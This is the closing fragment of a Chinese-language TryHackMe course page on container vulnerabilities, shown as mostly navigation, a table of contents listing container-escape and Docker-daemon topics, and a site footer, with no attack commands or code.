<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击我完成房间！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Container Security/Container Vulnerabilities.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/docs/Modules/Container Security/Intro to Kubernetes"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Kubernetes 简介</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/docs/Modules/Container Security/Container Hardening"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">容器加固</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#任务-1-简介部署" class="table-of-contents__link toc-highlight">任务 1 简介（部署）</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li><li><a href="#先决条件" class="table-of-contents__link toc-highlight">先决条件</a></li><li><a href="#重要背景" class="table-of-contents__link toc-highlight">重要背景</a></li><li><a href="#部署本房间的易受攻击机器" class="table-of-contents__link toc-highlight">部署本房间的易受攻击机器</a></li></ul></li><li><a href="#任务-2-容器漏洞-101" class="table-of-contents__link toc-highlight">任务 2 容器漏洞 101</a><ul><li><a href="#我们预期在-docker-容器中找到哪些类型的漏洞" class="table-of-contents__link toc-highlight">我们预期在 Docker 容器中找到哪些类型的漏洞</a></li></ul></li><li><a href="#任务-3-漏洞-1特权容器能力" class="table-of-contents__link toc-highlight">任务 3 漏洞 1：特权容器（能力）</a><ul><li><a href="#理解能力" class="table-of-contents__link toc-highlight">理解能力</a></li><li><a href="#这对我们意味着什么" class="table-of-contents__link toc-highlight">这对我们意味着什么</a></li><li><a href="#漏洞解释" class="table-of-contents__link toc-highlight">漏洞解释</a></li></ul></li><li><a href="#任务-4-漏洞-2通过暴露的-docker-守护进程逃逸" class="table-of-contents__link toc-highlight">任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸</a><ul><li><a href="#unix-套接字-101通用" class="table-of-contents__link toc-highlight">Unix 套接字 101（通用）</a></li><li><a href="#docker-如何使用套接字" class="table-of-contents__link toc-highlight">Docker 如何使用套接字</a></li><li><a href="#在容器中查找-docker-套接字" class="table-of-contents__link toc-highlight">在容器中查找 Docker 套接字</a></li><li><a href="#利用容器中的-docker-套接字" class="table-of-contents__link toc-highlight">利用容器中的 Docker 套接字</a></li><li><a href="#验证成功" class="table-of-contents__link toc-highlight">验证成功</a></li></ul></li><li><a href="#任务-5-漏洞-3通过暴露的-docker-守护进程进行远程代码执行" class="table-of-contents__link toc-highlight">任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行</a><ul><li><a href="#docker-引擎---tcp-套接字版" class="table-of-contents__link toc-highlight">Docker 引擎 - TCP 套接字版</a></li><li><a href="#漏洞" class="table-of-contents__link toc-highlight">漏洞</a></li><li><a href="#枚举查找设备是否具有可远程访问的-docker" class="table-of-contents__link toc-highlight">枚举：查找设备是否具有可远程访问的 Docker</a></li><li><a href="#在我们的目标上执行-docker-命令" class="table-of-contents__link toc-highlight">在我们的目标上执行 Docker 命令</a></li><li><a href="#现在怎么办" class="table-of-contents__link toc-highlight">现在怎么办</a></li></ul></li><li><a href="#任务-6-漏洞-4滥用命名空间" class="table-of-contents__link toc-highlight">任务 6 漏洞 4：滥用命名空间</a><ul><li><a href="#什么是命名空间" class="table-of-contents__link toc-highlight">什么是命名空间</a></li><li><a href="#确定我们是否在容器中进程" class="table-of-contents__link toc-highlight">确定我们是否在容器中（进程）</a></li><li><a href="#我们如何滥用命名空间" class="table-of-contents__link toc-highlight">我们如何滥用命名空间</a></li><li><a href="#漏洞-1" class="table-of-contents__link toc-highlight">漏洞</a></li></ul></li><li><a href="#任务-7-结论" class="table-of-contents__link toc-highlight">任务 7 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>